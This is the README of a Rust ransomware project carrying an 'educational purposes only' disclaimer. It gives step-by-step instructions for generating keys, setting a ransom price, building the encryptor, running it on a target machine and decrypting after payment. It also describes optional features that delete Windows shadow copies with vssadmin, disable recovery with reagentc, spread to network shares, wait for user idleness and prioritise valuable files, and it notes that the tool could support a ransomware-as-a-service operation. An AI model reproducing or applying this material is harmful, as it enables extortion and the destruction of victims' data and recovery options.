# THIS IS FOR EDUCATIONAL PURPOSES ONLY!

## Simple Setup Steps

1. Generate a keypair with `cargo run --release -p decrypt -- generate 4096` (writes `priv.key` and `pub.key`)
2. Copy the public key into the `client/` folder
3. Set the price and UUID via the compile-time values in `.cargo/config.toml` (`PRICE`, `UUID`) and modify the message
4. Build the client using `cargo build --release --bin client`
5. Run client on target machine
6. Having the private key, and both files generated on the target machine in the projects' root folder, use `cargo run --release --bin decrypt` to print the target's info and generate the decryption key
7. Copy decryption key on target machine, use `client decrypt` where "client" is the executable filename, to decrypt the files on the target machine

## Features
 - Keys are generated offline and use a combination of symmetric and asymmetric keys to make the files unrecoverable without the private key, even if the target's network is monitored.
 - Should be cross platform
 - Multi threaded
 - "Steals" hardware info

## Workspace layout
- `client/` - the encryptor binary. Thin `main.rs` over a `client_lib` library crate split into modules:
  - `walker` - disk discovery + encryption/decryption of trees, sequential / rayon-parallel / adaptive paths, and the opt-in priority scan pipeline
  - `crypto` - XChaCha20Poly1305 streaming encrypter (tunable buffer, whole-file vs streaming crossover, output preallocation, partial-file cleanup)
  - `exclusions` - always-on self-preservation: never encrypt the running binary, key blobs, ransom note, system dirs, or paging/hibernation files
  - `output` / `sysinfo` - ransom-note payload (`victim`, `hacker`, `price`, message) with host hardware fingerprinting
  - `idle` / `net_share` / `shadow` / `awake` - optional behaviors, one feature flag each
- `decrypt/` - the operator-side binary. Decrypts `key.part1` + `key.part2` with `priv.key` and also generates fresh RSA keypairs (`decrypt generate [BITS]`, default 4096). Replaces the old standalone `generator` crate.
- `tests/generate_fixtures/` - generates a realistic ~450-file fixture tree for benchmarking/integration tests (`cargo gen-fixtures`, alias in `.cargo/config.toml`).

## Optional cargo features (all OFF by default - a default build keeps the original behavior before this massive rework)
- `priority-scan` - two-phase scan: fast content-free inventory, tier files (extensions + keyword + user-docs-dir boosts), encrypt highest-value first, can be heavily improved upon
- `idle-gating` - only start once the machine has been idle past `IDLE_THRESHOLD_SECS`, pause while the user is active
- `net-shares` - also walk Windows mapped drives / UNC shares (WNet) and Linux NFS/CIFS mounts (`/proc/mounts`)
- `vss-delete` - delete Windows Volume Shadow Copies (`vssadmin`) and disable WinRE (`reagentc /disable`)
- `pressure` - hold the system awake for the whole run so it can't sleep mid-encryption

Enable with e.g. `cargo build --release --bin client --features "priority-scan idle-gating"`.

## Testing & benchmarking
- Integration tests: `cargo test` (roundtrip encrypt->decrypt, excluded files untouched); `cargo test --features priority-scan --test priority_scan`
- Decryptor e2e: `cargo test -p decrypt` (generate + decrypt roundtrip on a real keypair)
- Benches (criterion, `harness = false`): `cargo bench` - `encrypt_bench` (strategy/buffer/preallocation), `walker_bench` (walkdir vs jwalk, parallelism), `async_bench` (sync vs tokio fs)

## About
 This is the most secure ransomware I can think of, it has a key generator binary, a client and a "decrypter" that lets the attacker decrypt the target's files.
 This can be codded with a backend to automate an entire RaaS (Ransomware as a Service) operation.
 However I didn't code a backend so "script kiddies" can't just host this and extract money from innocent people.

 If you didn't read the first "part", this is for EDUCATIONAL PURPOSES ONLY, please do NOT use this for any illegal purpose.